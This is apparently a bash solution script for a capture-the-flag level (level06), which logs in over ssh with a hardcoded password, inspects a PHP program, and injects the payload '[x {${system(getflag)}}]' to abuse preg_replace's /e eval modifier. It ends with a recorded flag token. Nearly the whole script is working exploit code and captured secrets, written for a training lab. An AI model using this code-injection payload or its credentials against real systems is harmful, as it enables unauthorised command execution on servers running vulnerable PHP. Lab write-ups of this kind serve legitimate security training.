#!/bin/bash

ssh() {
    sshpass -p 'viuaaale9huek52boumoomioc' ssh level06@localhost -p 2220 "$1"  
}


ssh "ls -la"

ssh "cat level06.php"

ssh 'echo "hello" > /tmp/test; ./level06.php /tmp/test'

echo "preg_replace('/(\[x (.*)\])\/e', '', \$a);"

echo '[x {${system(getflag)}}]' | ssh 'cat > /tmp/exploit.txt'

ssh './level06 /tmp/exploit.txt'

#Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
